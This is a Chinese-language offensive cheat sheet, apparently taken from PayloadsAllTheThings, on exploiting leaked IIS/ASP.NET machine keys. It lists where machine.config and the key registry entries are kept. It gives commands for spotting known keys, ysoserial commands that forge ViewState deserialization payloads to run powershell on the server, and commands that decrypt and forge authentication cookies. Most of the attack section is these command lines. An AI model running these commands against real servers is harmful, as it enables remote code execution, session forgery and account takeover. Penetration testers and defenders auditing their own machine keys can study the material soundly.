# IIS Machine Keys - IIS机器密钥利用

[SEARCH_KEYWORDS]
漏洞类型: IIS Machine Keys ViewState Deserialization 机器密钥泄露
攻击类型: Remote Code Execution ViewState Forgery Cookie Forgery
关键词: machineKey ViewState validationKey decryptionKey ASP.NET IIS
技术: ViewState Decoding ViewState Generation RCE via ViewState Cookie Manipulation
文件: web.config machine.config viewstate __VIEWSTATEGENERATOR

[CONTENT]

## IIS机器密钥概述

机器密钥用于加密解密表单认证cookie数据和视图状态数据，以及验证进程外会话状态标识。

## ViewState格式

| 格式 | 属性 |
|------|------|
| Base64 | `EnableViewStateMac=False`, `ViewStateEncryptionMode=False` |
| Base64 + MAC | `EnableViewStateMac=True` |
| Base64 + 加密 | `ViewStateEncryptionMode=True` |

默认未加密ViewState以`/wEP`开头。

## 机器密钥格式

```xml
<machineKey validationKey="[String]" decryptionKey="[String]" validation="[SHA1|MD5|AES...]" decryption="[Auto|DES|AES...]" />
```

## 配置文件位置

### 32位

- `C:\Windows\Microsoft.NET\Framework\v2.0.50727\config\machine.config`
- `C:\Windows\Microsoft.NET\Framework\v4.0.30319\config\machine.config`

### 64位

- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\machine.config`
- `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\config\machine.config`

### 注册表(AutoGenerate)

- `HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\4.0.30319.0\AutoGenKeyV4`

## 识别已知机器密钥

### viewstalker

```powershell
./viewstalker --viewstate /wEPD...TYQ== -m 3E92B2D6 -M ./MachineKeys2.txt
```

### badsecrets

```ps1
python examples/blacklist3r.py --viewstate /wEPDwUK...j81TYQ== --generator 3E92B2D6
```

### viewgen

```powershell
viewgen --guess "/wEPDwUKMTYyOD...WRkuVmqYhhtcnJl6Nfet5ERqNHMADI="
```

## 生成ViewState实现RCE

### MAC未启用

```ps1
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe ..."
```

### MAC启用，加密未启用

```ps1
# 找到validationkey
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUK... --purpose=viewstate --valalgo=sha1 --modifier=CA0B0334 --macdecode --legacy

# 生成ViewState
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe ..." --generator=CA0B0334 --validationalg="SHA1" --validationkey="..."
```

### MAC和加密都启用

```ps1
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo 123 > c:\windows\temp\test.txt" --path="/somepath/test.aspx" --apppath="/testaspx/" --decryptionalg="AES" --decryptionkey="..." --validationalg="HMACSHA256" --validationkey="..."
```

## 使用机器密钥编辑Cookie

```powershell
# 解密cookie
AspDotNetWrapper.exe --keypath C:\MachineKey.txt --cookie XXXXXXX_XXXXX --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes

# 加密cookie
AspDotNetWrapper.exe --decryptDataFilePath C:\DecryptedText.txt
```

## 参考文档

原始来源: PayloadsAllTheThings/API Key Leaks/IIS-Machine-Keys.md